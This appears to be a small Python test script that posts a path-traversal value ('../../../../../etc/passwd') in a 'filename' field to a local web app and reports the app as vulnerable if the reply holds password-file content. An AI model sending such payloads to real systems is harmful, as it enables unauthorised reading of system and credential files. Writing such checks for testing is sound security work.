import requests


def main(url):
    req = requests.post(url, data={'filename' : "../../../../../etc/passwd"})
    result = bool(req.text.find("ftp:") > 0)
    if result :
        msg = "The app is vulnerable"
    else :
        msg = "You are in good hands"
    return (result, msg)

if __name__ == '__main__':
	url = "http://localhost:5000/home"
	res = main(url)
	print(res)